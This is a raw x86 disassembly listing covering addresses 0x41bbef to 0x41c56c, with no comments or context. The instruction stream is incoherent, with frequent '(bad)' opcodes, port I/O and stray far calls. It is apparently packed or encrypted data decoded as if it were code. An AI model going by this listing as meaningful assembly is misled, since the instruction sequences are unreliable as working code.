  41bbef:	ins    BYTE PTR es:[edi],dx
  41bbf0:	popa   
  41bbf1:	outs   dx,BYTE PTR ds:[esi]
  41bbf2:	adc    al,0x58
  41bbf4:	dec    edx
  41bbf5:	pushf  
  41bbf6:	mov    edi,ebp
  41bbf8:	dec    bh
  41bbfa:	pushf  
  41bbfb:	xchg   ecx,eax
  41bbfc:	outs   dx,BYTE PTR ds:[esi]
  41bbfd:	mov    bl,0x88
  41bbff:	cdq    
  41bc00:	cmp    al,0x6d
  41bc02:	loope  0x41bba6
  41bc04:	out    0xbb,al
  41bc06:	adc    BYTE PTR [edx+eiz*1-0x45c5f1f8],dl
  41bc0d:	leave  
  41bc0e:	addr16 cld 
  41bc10:	inc    ecx
  41bc11:	out    0x9a,al
  41bc13:	popa   
  41bc14:	inc    ebp
  41bc15:	or     BYTE PTR [eax+eax*2+0x6b],ah
  41bc19:	iret   
  41bc1a:	fs or  DWORD PTR cs:[esi],ebp
  41bc1e:	int3   
  41bc1f:	fwait
  41bc20:	ror    DWORD PTR [eax+0x66fc2210],cl
  41bc26:	sub    ch,cl
  41bc28:	nop
  41bc29:	adc    al,0xd3
  41bc2b:	xor    dh,ch
  41bc2d:	xor    BYTE PTR [eax],bh
  41bc2f:	xchg   esp,eax
  41bc30:	dec    eax
  41bc31:	and    BYTE PTR [edi+0x55],0xf9
  41bc35:	lahf   
  41bc36:	mov    ecx,0xbabf1615
  41bc3b:	pop    ss
  41bc3c:	fs sub ch,ah
  41bc3f:	dec    ebp
  41bc40:	push   esp
  41bc41:	or     BYTE PTR [eax],cl
  41bc43:	inc    ebp
  41bc44:	dec    ebp
  41bc45:	fs inc edi
  41bc47:	xchg   esi,eax
  41bc48:	test   DWORD PTR [ecx],ebx
  41bc4a:	out    dx,eax
  41bc4b:	adc    eax,0x85c70b39
  41bc50:	push   0x6f
  41bc52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc53:	push   edx
  41bc54:	mov    bx,0xfc11
  41bc58:	or     esi,DWORD PTR [edi-0xf]
  41bc5b:	fs popf 
  41bc5d:	jne    0x41bbe8
  41bc5f:	sar    bl,cl
  41bc61:	mov    cs,ebx
  41bc63:	sar    BYTE PTR [ecx+ebp*4+0x36],cl
  41bc67:	sbb    DWORD PTR [ebx],eax
  41bc69:	(bad)  
  41bc6a:	retf   0x4e19
  41bc6d:	in     al,dx
  41bc6e:	jg     0x41bc75
  41bc70:	stos   BYTE PTR es:[edi],al
  41bc71:	jne    0x41bcd6
  41bc73:	out    dx,eax
  41bc74:	jmp    0x41bc3d
  41bc76:	out    dx,eax
  41bc77:	repz push bp
  41bc7a:	out    dx,al
  41bc7b:	pusha  
  41bc7c:	idiv   cl
  41bc7e:	in     eax,0xe
  41bc80:	fidivr DWORD PTR [ebp+eax*1+0x44]
  41bc84:	jae    0x41bcda
  41bc86:	das    
  41bc87:	ficomp WORD PTR [esp+ecx*2-0x37933510]
  41bc8e:	ffree  st(0)
  41bc90:	jp     0x41bc99
  41bc92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc93:	sbb    eax,0x3b322cab
  41bc98:	das    
  41bc99:	jg     0x41bd06
  41bc9b:	daa    
  41bc9c:	sahf   
  41bc9d:	cmp    eax,0xa4660c45
  41bca2:	sahf   
  41bca3:	pop    esp
  41bca4:	push   ebx
  41bca5:	neg    BYTE PTR [esi+ecx*4-0x10]
  41bca9:	outs   dx,BYTE PTR ds:[esi]
  41bcaa:	jns    0x41bce0
  41bcac:	jbe    0x41bd0d
  41bcae:	mov    edx,0xbcdbdab4
  41bcb3:	and    edx,DWORD PTR [ecx]
  41bcb5:	in     al,0xbc
  41bcb7:	dec    edx
  41bcb8:	sahf   
  41bcb9:	inc    esi
  41bcba:	jg     0x41bc59
  41bcbc:	call   0x1474:0xf0bc8de6
  41bcc3:	cld    
  41bcc4:	xlat   BYTE PTR gs:[ebx]
  41bcc6:	popa   
  41bcc7:	cmp    ecx,DWORD PTR [ebx+edi*2+0x6c380abe]
  41bcce:	(bad)  
  41bccf:	cmp    ecx,edx
  41bcd1:	xchg   esi,eax
  41bcd2:	in     eax,0x35
  41bcd4:	popa   
  41bcd5:	and    eax,0x1432e9c5
  41bcda:	loopne 0x41bcdb
  41bcdc:	ins    BYTE PTR es:[edi],dx
  41bcdd:	push   eax
  41bcde:	je     0x41bd03
  41bce0:	pop    esi
  41bce1:	inc    edi
  41bce2:	ret    
  41bce3:	je     0x41bca9
  41bce5:	loope  0x41bcd5
  41bce7:	add    edx,DWORD PTR ds:0x198e0207
	...
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0xb439d9d8
  41bd64:	shr    DWORD PTR [ebx],0x13
  41bd67:	sub    eax,DWORD PTR [ecx]
  41bd69:	add    bh,bh
  41bd6b:	add    BYTE PTR [eax],al
  41bd6d:	add    BYTE PTR [ebx+edi*1+0x0],bh
  41bd71:	cmp    al,0x1f
  41bd73:	sbb    al,0x8a
  41bd75:	mov    eax,0xbaba6f9
  41bd7a:	xchg   edx,eax
  41bd7b:	in     al,dx
  41bd7c:	xor    eax,0xded847e7
  41bd81:	xor    eax,0x4f9d2436
  41bd86:	inc    esp
  41bd87:	dec    esi
  41bd88:	mov    ds:0x33f460aa,al
  41bd8d:	or     dh,bl
  41bd8f:	sbb    DWORD PTR [esi+ecx*2+0x5cfd16c],esi
  41bd96:	and    al,0x18
  41bd98:	dec    eax
  41bd99:	jmp    0x41bdf4
  41bd9b:	jmp    0x41bd9d
  41bd9d:	sub    eax,0x2619d128
  41bda2:	jbe    0x41bd2f
  41bda4:	xlat   BYTE PTR ds:[ebx]
  41bda5:	popa   
  41bda6:	jae    0x41bdc7
  41bda8:	push   ds
  41bda9:	stos   BYTE PTR es:[edi],al
  41bdaa:	jmp    0x665af8ec
  41bdaf:	pop    edx
  41bdb0:	test   al,0x3f
  41bdb2:	lods   eax,DWORD PTR ds:[esi]
  41bdb3:	scas   eax,DWORD PTR es:[edi]
  41bdb4:	dec    edx
  41bdb5:	(bad)  
  41bdb6:	div    DWORD PTR [edi+0x45]
  41bdb9:	adc    esp,DWORD PTR [edi+0xa]
  41bdbc:	imul   esi,DWORD PTR [eax+eiz*2],0x966f9f6c
  41bdc3:	mov    edx,DWORD PTR [ebx-0x332719a]
  41bdc9:	dec    esp
  41bdca:	out    dx,al
  41bdcb:	lds    esi,FWORD PTR cs:[ebx+0x40da8719]
  41bdd2:	sbb    BYTE PTR [eax+0x6d20123a],dh
  41bdd8:	cmp    DWORD PTR [eax+ebp*4+0x1b],eax
  41bddc:	daa    
  41bddd:	nop
  41bdde:	popf   
  41bddf:	mov    al,ds:0x73b30fd1
  41bde4:	dec    eax
  41bde5:	nop
  41bde6:	test   al,0x14
  41bde8:	fs cmp eax,0x336087cb
  41bdee:	or     DWORD PTR [ecx],edi
  41bdf0:	into   
  41bdf1:	lods   eax,DWORD PTR ds:[esi]
  41bdf2:	(bad)  
  41bdf3:	idiv   BYTE PTR [edx-0x4f]
  41bdf6:	cmp    ecx,DWORD PTR ds:0x3248fd9a
  41bdfc:	imul   esp,DWORD PTR [edi],0xb542103a
  41be02:	pop    eax
  41be03:	add    bh,BYTE PTR [eax]
  41be05:	xchg   edi,eax
  41be06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be07:	xchg   edx,eax
  41be08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be09:	jo     0x41be53
  41be0b:	xor    cl,dh
  41be0d:	and    cl,BYTE PTR [ecx+0x33bd3c7a]
  41be13:	mov    ch,0xa0
  41be15:	lock or eax,0xb38aec34
  41be1b:	xor    eax,0x34e08085
  41be20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be21:	pop    DWORD PTR [ebp*2+0x5e4348f6]
  41be28:	jbe    0x41be68
  41be2a:	bound  esp,QWORD PTR [edi+esi*2]
  41be2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be2e:	or     ah,BYTE PTR [esi+0x13a65ea]
  41be34:	sub    esi,DWORD PTR [ebx]
  41be36:	xchg   edi,eax
  41be37:	cmp    BYTE PTR [esi+0x66],al
  41be3a:	mov    cl,0x7d
  41be3c:	lea    esp,[edx+0x153bb9d]
  41be42:	int3   
  41be43:	arpl   WORD PTR [ecx+0x60],di
  41be46:	jo     0x41bdf6
  41be48:	mov    dh,BYTE PTR [edx-0x3acf2f25]
  41be4e:	jmp    FWORD PTR [esi-0x78]
  41be51:	or     eax,0x56ab22e3
  41be56:	push   esp
  41be57:	pop    es
  41be58:	inc    edx
  41be59:	xor    al,0xc2
  41be5b:	xchg   esp,eax
  41be5c:	lahf   
  41be5d:	stc    
  41be5e:	fdiv   QWORD PTR [ebp-0x1e1e05b6]
  41be64:	lods   eax,DWORD PTR ds:[esi]
  41be65:	cmc    
  41be66:	push   eax
  41be67:	sub    DWORD PTR [ebx+ecx*4+0x64],0xffffffdb
  41be6c:	imul   eax,DWORD PTR [eax],0x0
	...
  41bed3:	add    BYTE PTR [eax],al
  41bed5:	add    BYTE PTR [ebp-0x63956373],al
  41bedb:	jnp    0x41bed4
  41bedd:	out    dx,eax
  41bede:	mov    ebp,DWORD PTR [ecx+0x5d6a3f66]
  41bee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bee5:	lods   al,BYTE PTR ds:[esi]
  41bee6:	adc    ch,BYTE PTR [ecx+eax*1]
  41bee9:	add    bh,bh
  41beeb:	add    BYTE PTR [eax],al
  41beed:	add    BYTE PTR [esi+0x7d372585],al
  41bef3:	loope  0x41bf06
  41bef5:	mov    ah,0xaa
  41bef7:	mov    bh,BYTE PTR [ecx+ebx*1-0x51]
  41befb:	cmp    dh,BYTE PTR [esi+0x5]
  41befe:	mov    dl,0x93
  41bf00:	outs   dx,DWORD PTR ds:[esi]
  41bf01:	stos   BYTE PTR es:[edi],al
  41bf02:	push   esp
  41bf03:	mov    al,gs:0xa77875c9
  41bf09:	shr    DWORD PTR [edx],1
  41bf0b:	test   eax,0x8854b999
  41bf10:	aaa    
  41bf11:	lea    esi,[ebp-0x68]
  41bf14:	xchg   edx,eax
  41bf15:	pop    ds
  41bf16:	dec    edi
  41bf17:	or     eax,DWORD PTR [edx]
  41bf19:	pushf  
  41bf1a:	or     dl,BYTE PTR [edi+0x40979279]
  41bf20:	xchg   BYTE PTR [eax-0x17ddc3af],bl
  41bf26:	daa    
  41bf27:	mov    al,ds:0x41db6e87
  41bf2c:	cld    
  41bf2d:	or     bl,cl
  41bf2f:	out    dx,al
  41bf30:	and    al,0xf5
  41bf32:	rol    DWORD PTR [ebx],cl
  41bf34:	icebp  
  41bf35:	test   eax,0x2b6a400d
  41bf3a:	pop    eax
  41bf3b:	iret   
  41bf3c:	les    ebx,FWORD PTR [eax+0x4a]
  41bf3f:	jne    0x41beed
  41bf41:	adc    eax,0x37dad0a3
  41bf46:	outs   dx,BYTE PTR ds:[esi]
  41bf47:	inc    ebx
  41bf48:	imul   esp,DWORD PTR [esi+0x8],0xbea8fce2
  41bf4f:	mov    al,0xf
  41bf51:	dec    esp
  41bf52:	inc    esi
  41bf53:	push   ss
  41bf54:	scas   al,BYTE PTR es:[edi]
  41bf55:	xor    eax,DWORD PTR [esi]
  41bf57:	cmp    eax,0xbe618baa
  41bf5c:	jno    0x41bf8e
  41bf5e:	cmp    DWORD PTR [eax],ebx
  41bf60:	push   0xe
  41bf62:	xchg   edx,eax
  41bf63:	fstp   QWORD PTR [ebp+0x27]
  41bf66:	push   es
  41bf67:	aas    
  41bf68:	scas   al,BYTE PTR es:[edi]
  41bf69:	and    dh,BYTE PTR [ecx+0x692a14ec]
  41bf6f:	aas    
  41bf70:	pop    esi
  41bf71:	fmul   DWORD PTR [esi+0x7]
  41bf74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf75:	push   ebx
  41bf76:	adc    BYTE PTR [ebp-0x42c9f547],dh
  41bf7c:	retf   0x7b2b
  41bf7f:	mov    edi,0x844d19d
  41bf84:	or     dh,ah
  41bf86:	and    al,BYTE PTR [ebx]
  41bf88:	aas    
  41bf89:	dec    esi
  41bf8a:	cmp    DWORD PTR [ecx+0x27],edx
  41bf8d:	aaa    
  41bf8e:	sbb    eax,0xc8d24af2
  41bf93:	cdq    
  41bf94:	adc    DWORD PTR es:[esi+0x79],edx
  41bf98:	addr16 cmp eax,0x976ac35d
  41bf9e:	xor    eax,0x29d241e7
  41bfa3:	gs or  eax,0x3ab8c64f
  41bfa9:	das    
  41bfaa:	inc    eax
  41bfab:	push   es
  41bfac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfad:	push   eax
  41bfae:	lea    eax,[ecx+eiz*4-0x5eaf313e]
  41bfb5:	xchg   esp,eax
  41bfb6:	mov    es,WORD PTR [ebx+0x6cecfd47]
  41bfbc:	stos   DWORD PTR es:[edi],eax
  41bfbd:	or     BYTE PTR [ecx+0x1fc0bd61],bh
  41bfc3:	(bad)  
  41bfc4:	adc    al,0xbe
  41bfc6:	inc    edi
  41bfc7:	ds out 0x57,eax
  41bfca:	xchg   DWORD PTR [esi],ebp
  41bfcc:	sar    bh,1
  41bfce:	fidiv  WORD PTR [eax+0x3425d501]
  41bfd4:	xchg   esi,eax
  41bfd5:	cmp    eax,0xc865c8a5
  41bfda:	adc    DWORD PTR [eax],ebp
  41bfdc:	shr    BYTE PTR [edi],cl
  41bfde:	jb     0x41c045
  41bfe0:	dec    edi
  41bfe1:	lds    edi,FWORD PTR [ebx+0x243578eb]
  41bfe7:	arpl   WORD PTR [ecx+0x28836c78],sp
	...
  41c055:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	nop
  41c063:	sbb    esi,DWORD PTR [eax+edi*4+0x12d11]
  41c06a:	inc    DWORD PTR [eax]
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	inc    eax
  41c06f:	xchg   edx,eax
  41c070:	lds    eax,FWORD PTR [ecx-0x73]
  41c073:	or     al,BYTE PTR [eax]
  41c075:	and    BYTE PTR [ebx+0x23be7636],ah
  41c07b:	cmc    
  41c07c:	outs   dx,BYTE PTR ds:[esi]
  41c07d:	scas   al,BYTE PTR es:[edi]
  41c07e:	inc    edi
  41c07f:	pop    edx
  41c080:	fiadd  WORD PTR ds:0xcef5fd42
  41c086:	push   ecx
  41c087:	scas   al,BYTE PTR es:[edi]
  41c088:	add    esp,DWORD PTR [ecx-0x37eaf66b]
  41c08e:	cmc    
  41c08f:	inc    ebp
  41c090:	es sbb eax,0x9dd59ba
  41c096:	xchg   esp,eax
  41c097:	push   eax
  41c098:	js     0x41c0ba
  41c09a:	js     0x41c0e7
  41c09c:	jle    0x41c063
  41c09e:	jno    0x41c0e2
  41c0a0:	xor    al,0x2a
  41c0a2:	mov    edi,0x1d9c752e
  41c0a7:	ins    DWORD PTR es:[edi],dx
  41c0a8:	data16 sahf 
  41c0aa:	mov    bl,0xe3
  41c0ac:	aaa    
  41c0ad:	push   edi
  41c0ae:	sub    edi,DWORD PTR [edx-0x68]
  41c0b1:	adc    esp,edx
  41c0b3:	in     al,0xe0
  41c0b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0b6:	in     al,0x16
  41c0b8:	xor    BYTE PTR [ecx+0x7a8f9d72],bh
  41c0be:	sub    esp,ebx
  41c0c0:	mov    bh,0x1
  41c0c2:	sbb    ebx,DWORD PTR [ebp+0x374da877]
  41c0c8:	data16 test al,0x67
  41c0cb:	jmp    0x41c0f4
  41c0cd:	test   al,0xf5
  41c0cf:	pushf  
  41c0d0:	ins    DWORD PTR es:[edi],dx
  41c0d1:	mov    esp,0xff244192
  41c0d6:	(bad)  
  41c0d7:	pop    esi
  41c0d8:	cmp    BYTE PTR [ebx],bl
  41c0da:	es cmc 
  41c0dc:	imul   esp,DWORD PTR [ebp-0x54],0xfb4f3d72
  41c0e3:	cmc    
  41c0e4:	ret    0x29b6
  41c0e7:	cld    
  41c0e8:	test   DWORD PTR [esi-0x33b31a56],0xb4ff76bd
  41c0f2:	bound  esi,QWORD PTR [eax]
  41c0f4:	sub    dh,BYTE PTR [eax]
  41c0f6:	push   ebx
  41c0f7:	clc    
  41c0f8:	mov    dh,0x1d
  41c0fa:	add    al,0xe6
  41c0fc:	aaa    
  41c0fd:	xchg   BYTE PTR ds:0x9bcb4a1d,dh
  41c103:	popf   
  41c104:	inc    esp
  41c105:	lahf   
  41c106:	stos   DWORD PTR es:[edi],eax
  41c107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c108:	not    bl
  41c10a:	dec    ebx
  41c10b:	sub    BYTE PTR [ecx-0x5a],ch
  41c10e:	lds    ecx,FWORD PTR [esi-0x22]
  41c111:	cmp    dh,al
  41c113:	(bad)  
  41c114:	sbb    DWORD PTR [esi-0x51],edi
  41c117:	arpl   WORD PTR [edx],bx
  41c119:	push   esp
  41c11a:	jno    0x41c0e7
  41c11c:	pusha  
  41c11d:	les    ecx,FWORD PTR ds:0xda6f7544
  41c123:	mov    DWORD PTR [ebx-0x749fcb0c],ebp
  41c129:	aaa    
  41c12a:	mov    dl,0x1
  41c12c:	aas    
  41c12d:	lea    esp,[edx]
  41c12f:	adc    edx,edi
  41c131:	jge    0x41c0ed
  41c133:	jo     0x41c114
  41c135:	iret   
  41c136:	jp     0x41c197
  41c138:	ds cwde 
  41c13a:	add    al,0x16
  41c13c:	(bad)
  41c13f:	dec    ebp
  41c140:	or     DWORD PTR [ebx-0x19eded99],esi
  41c146:	sub    ch,BYTE PTR [ebx+0xf660f5d]
  41c14c:	std    
  41c14d:	and    BYTE PTR [ecx+0x793b49a5],ch
  41c153:	adc    BYTE PTR [ebx+0x4b],dl
  41c156:	inc    esp
  41c157:	xor    bh,dh
  41c159:	mul    DWORD PTR [ecx-0x1]
  41c15c:	add    al,0x5b
  41c15e:	pop    ss
  41c15f:	add    al,0xb
  41c161:	fwait
  41c162:	lods   eax,DWORD PTR ds:[esi]
  41c163:	neg    BYTE PTR ds:0x48bd0d12
  41c169:	fs cli 
  41c16b:	adc    al,0x3b
	...
  41c1d5:	add    cl,bl
  41c1d7:	dec    edx
  41c1d8:	mov    eax,ds:0xd9fbb3f8
  41c1dd:	imul   edi,DWORD PTR ds:0x44e90501,0xffffff8d
  41c1e4:	loopne 0x41c1bf
  41c1e6:	adc    BYTE PTR [esi],ch
  41c1e8:	add    DWORD PTR [eax],eax
  41c1ea:	inc    DWORD PTR [eax]
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	retf   
  41c1ef:	cmp    eax,DWORD PTR [edi-0x48a19c8e]
  41c1f5:	and    BYTE PTR [ebx-0x4112a580],bl
  41c1fb:	mov    dl,0x77
  41c1fd:	mov    ah,0x28
  41c1ff:	push   0x61a2be0c
  41c204:	arpl   WORD PTR [esi+0x78e324fd],dx
  41c20a:	add    al,0x90
  41c20c:	test   BYTE PTR [ebp+0x4],al
  41c20f:	dec    edi
  41c210:	dec    edi
  41c211:	call   0xeae33b31
  41c216:	ins    DWORD PTR es:[edi],dx
  41c217:	sub    eax,DWORD PTR [edi]
  41c219:	fdivr  DWORD PTR [ebp+0x715b30d]
  41c21f:	jge    0x41c1a3
  41c221:	std    
  41c222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c223:	push   ds
  41c224:	stos   BYTE PTR es:[edi],al
  41c225:	cdq    
  41c226:	mov    gs,WORD PTR [ecx-0x25e020a3]
  41c22c:	hlt    
  41c22d:	mov    ds:0x4adc77f2,eax
  41c232:	in     eax,0x94
  41c234:	mov    edx,0xc9f6b330
  41c239:	xor    al,0x1e
  41c23b:	fild   DWORD PTR [esi+0x7d]
  41c23e:	loop   0x41c215
  41c240:	pop    eax
  41c241:	arpl   WORD PTR [ecx-0x1de6a3de],si
  41c247:	cmp    DWORD PTR [edx-0xd496498],0xffffff94
  41c24e:	pop    eax
  41c24f:	bound  esp,QWORD PTR [ebx]
  41c251:	mov    BYTE PTR [edi+0x3],ch
  41c254:	in     al,0x56
  41c256:	fdivr  QWORD PTR [edx+0x21]
  41c259:	out    0xb0,eax
  41c25b:	push   ecx
  41c25c:	push   esi
  41c25d:	pop    ebx
  41c25e:	arpl   WORD PTR [ebp+0x38],dx
  41c261:	xor    edi,esp
  41c263:	mov    dh,dl
  41c265:	hlt    
  41c266:	xchg   edi,eax
  41c267:	loop   0x41c1f1
  41c269:	addr16 cmp eax,0x1de8566d
  41c26f:	(bad)
  41c272:	mov    esi,0x649ee7b0
  41c277:	and    cl,ah
  41c279:	xlat   BYTE PTR ds:[ebx]
  41c27a:	repz fdivr st,st(2)
  41c27d:	mov    edi,0x9879c085
  41c282:	sbb    DWORD PTR [edx+0x26],eax
  41c285:	inc    ebx
  41c286:	je     0x41c246
  41c288:	sbb    ebx,DWORD PTR [eax]
  41c28a:	cmp    al,0xda
  41c28c:	ins    DWORD PTR es:[di],dx
  41c28e:	add    al,bl
  41c290:	cmp    al,0xb
  41c292:	ins    BYTE PTR es:[edi],dx
  41c293:	xchg   edx,eax
  41c294:	sbb    eax,0x55445ed1
  41c299:	(bad)  
  41c29b:	es xchg edi,eax
  41c29d:	dec    ebp
  41c29e:	call   0x9027b10
  41c2a3:	ja     0x41c2fc
  41c2a5:	jns    0x41c305
  41c2a7:	push   cs
  41c2a8:	jp     0x41c274
  41c2aa:	mov    ecx,0xda8fa18e
  41c2af:	xor    eax,edx
  41c2b1:	sbb    al,bl
  41c2b3:	pop    ds
  41c2b4:	dec    eax
  41c2b5:	ins    BYTE PTR es:[edi],dx
  41c2b6:	jbe    0x41c2df
  41c2b8:	dec    edx
  41c2b9:	cld    
  41c2ba:	sbb    ebx,eax
  41c2bc:	xor    BYTE PTR [ecx-0x4552e3dc],0xa2
  41c2c3:	clc    
  41c2c4:	pop    ss
  41c2c5:	or     edx,edx
  41c2c7:	std    
  41c2c8:	aas    
  41c2c9:	push   ecx
  41c2ca:	and    eax,0xe8277caf
  41c2cf:	mov    edi,0xbe3132b3
  41c2d4:	fcmovbe st,st(3)
  41c2d6:	cmc    
  41c2d7:	jae    0x41c350
  41c2d9:	aam    0xb0
  41c2db:	shl    DWORD PTR [ebx+ecx*4+0x4e83add7],0x6d
  41c2e3:	mov    DWORD PTR [ecx+ecx*2-0x781ff26b],esi
  41c2ea:	(bad)  [eax+esi*8]
	...
  41c355:	add    bl,dh
  41c357:	and    ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	push   edx
  41c363:	rcl    BYTE PTR [ebx+ebp*2],1
  41c366:	comiss xmm0,DWORD PTR [ecx]
  41c369:	add    bh,bh
  41c36b:	add    BYTE PTR [eax],al
  41c36d:	add    cl,ah
  41c36f:	sti    
  41c370:	popa   
  41c371:	cmc    
  41c372:	pop    ebp
  41c373:	adc    ebx,ebp
  41c375:	and    al,0x5d
  41c377:	add    BYTE PTR [edi],0x51
  41c37a:	call   0x89dc630b
  41c37f:	outs   dx,DWORD PTR ds:[esi]
  41c380:	fisubr WORD PTR ds:0x7447a885
  41c386:	push   esp
  41c387:	jecxz  0x41c395
  41c389:	adc    al,0x76
  41c38b:	sub    eax,0xe53ac21d
  41c390:	enter  0x66f9,0xe4
  41c394:	and    BYTE PTR [esi-0x5a],0xc1
  41c398:	pop    edi
  41c399:	lods   al,BYTE PTR ds:[esi]
  41c39a:	test   eax,0x6647243d
  41c39f:	inc    esi
  41c3a0:	pop    esp
  41c3a1:	jmp    0x2d5c556d
  41c3a6:	stc    
  41c3a7:	lea    esi,[edx-0x374616b9]
  41c3ad:	push   eax
  41c3ae:	jle    0x41c3f4
  41c3b0:	cmp    ah,BYTE PTR [ebp-0x34130869]
  41c3b6:	fcomp  DWORD PTR [edi]
  41c3b8:	scas   al,BYTE PTR es:[edi]
  41c3b9:	or     al,BYTE PTR [eax]
  41c3bb:	imul   ebp
  41c3bd:	jo     0x41c420
  41c3bf:	mov    DWORD PTR [ecx],ecx
  41c3c1:	fcomp  QWORD PTR [ebx+0x29]
  41c3c4:	(bad)  
  41c3c5:	or     al,BYTE PTR [edi+0x46]
  41c3c8:	iret   
  41c3c9:	fdiv   QWORD PTR [ebp+0x1e2a813e]
  41c3cf:	inc    esp
  41c3d0:	in     eax,0xef
  41c3d2:	dec    esp
  41c3d3:	xlat   BYTE PTR ds:[ebx]
  41c3d4:	jge    0x41c39a
  41c3d6:	aam    0xae
  41c3d8:	mov    cl,0xe
  41c3da:	js     0x41c42f
  41c3dc:	sbb    eax,0x7b7673d4
  41c3e1:	or     BYTE PTR [edx],al
  41c3e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3e4:	outs   dx,BYTE PTR ds:[esi]
  41c3e5:	test   DWORD PTR [eax+0x76],ecx
  41c3e8:	cld    
  41c3e9:	xchg   edi,eax
  41c3ea:	push   ebx
  41c3eb:	mov    ?,WORD PTR [ebx+0x42fc3957]
  41c3f1:	cdq    
  41c3f2:	fwait
  41c3f3:	and    ah,bl
  41c3f5:	outs   dx,DWORD PTR ds:[esi]
  41c3f6:	mov    ebx,0xb55b8d70
  41c3fb:	cmc    
  41c3fc:	sbb    eax,0xa8fe9008
  41c401:	repnz xchg ebp,eax
  41c403:	add    BYTE PTR [eax],bh
  41c405:	sbb    eax,0x9bc387e3
  41c40a:	push   esp
  41c40b:	pusha  
  41c40c:	dec    ebp
  41c40d:	jecxz  0x41c3f2
  41c40f:	out    0x5d,al
  41c411:	pop    ss
  41c412:	push   ebp
  41c413:	sub    al,0x88
  41c415:	hlt    
  41c416:	shl    DWORD PTR [edi],cl
  41c418:	sar    BYTE PTR [ebx-0x62],cl
  41c41b:	js     0x41c418
  41c41d:	adc    BYTE PTR [eax-0xed3112],al
  41c423:	mov    eax,edx
  41c425:	xchg   DWORD PTR [edi+0x5],edx
  41c428:	rol    BYTE PTR [esi+ebp*2],cl
  41c42b:	pushf  
  41c42c:	jl     0x41c3f0
  41c42e:	sub    dl,BYTE PTR [eax-0x1d2014c0]
  41c434:	push   ebx
  41c435:	fimul  WORD PTR [ebx+0x13]
  41c438:	sbb    al,0xff
  41c43a:	dec    edx
  41c43b:	popf   
  41c43c:	out    dx,al
  41c43d:	push   eax
  41c43e:	shr    BYTE PTR [ebx+0x33],1
  41c441:	xor    BYTE PTR [eiz*8+0xb71f7e1],al
  41c448:	or     eax,0xadb74024
  41c44d:	out    0x89,al
  41c44f:	call   0x1b582ff1
  41c454:	popf   
  41c455:	or     DWORD PTR [edx],edi
  41c457:	xchg   DWORD PTR [edi+0x3a8ccbb0],edi
  41c45d:	call   0x96f9:0xc3306f29
  41c464:	fisub  DWORD PTR [esi]
  41c466:	add    edx,DWORD PTR [ebp+0x2c3f8b0c]
  41c46c:	cmp    eax,0x0
	...
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	sbb    al,0xc1
  41c4e4:	dec    esp
  41c4e5:	sbb    ecx,DWORD PTR [esi]
  41c4e7:	xor    BYTE PTR [ecx],al
  41c4e9:	add    bh,bh
  41c4eb:	add    BYTE PTR [eax],al
  41c4ed:	add    cl,bl
  41c4ef:	fcom   DWORD PTR [edx-0x52cca45d]
  41c4f5:	repnz dec ebx
  41c4f7:	addr16 push 0x192ab936
  41c4fd:	jle    0x41c4dd
  41c4ff:	ficomp WORD PTR [eax]
  41c501:	pop    eax
  41c502:	jl     0x41c49b
  41c504:	dec    ebx
  41c505:	sub    dh,BYTE PTR [ebx-0x3e]
  41c508:	jno    0x41c4ad
  41c50a:	lods   al,BYTE PTR ds:[esi]
  41c50b:	sub    esp,ebx
  41c50d:	mov    ds:0x67b2a9f,al
  41c512:	hlt    
  41c513:	add    al,0x60
  41c515:	push   esi
  41c516:	out    0x55,eax
  41c518:	sbb    al,0xdd
  41c51a:	xor    bh,BYTE PTR [ebx]
  41c51c:	push   0x553947b0
  41c521:	dec    ebx
  41c522:	jnp    0x41c4c7
  41c524:	push   ecx
  41c525:	adc    al,0x5f
  41c527:	imul   esp,DWORD PTR [ebx-0x54af7aa7],0xd68eabb
  41c531:	push   0x63cb0e7f
  41c536:	repz cmp eax,0x57111d50
  41c53c:	mov    dh,0x7b
  41c53e:	xor    DWORD PTR [ecx-0x52f1406d],ebx
  41c544:	lods   al,BYTE PTR ds:[esi]
  41c545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c546:	and    edi,eax
  41c548:	and    eax,0x572afc6d
  41c54d:	arpl   WORD PTR [esi+0x3d],cx
  41c550:	mov    cl,0xc2
  41c552:	and    BYTE PTR [eax],0xba
  41c555:	mov    ebp,ecx
  41c557:	xchg   esp,eax
  41c558:	xlat   BYTE PTR ds:[ebx]
  41c559:	out    0x62,eax
  41c55b:	iret   
  41c55c:	test   BYTE PTR [ecx+0x3e],ah
  41c55f:	dec    edi
  41c560:	js     0x41c50d
  41c562:	aam    0x41
  41c564:	sti    
  41c565:	std    
  41c566:	fs dec dx
  41c569:	lods   eax,DWORD PTR ds:[esi]
  41c56a:	js     0x41c54d
  41c56c:	and    eax,0xe8ab9bee
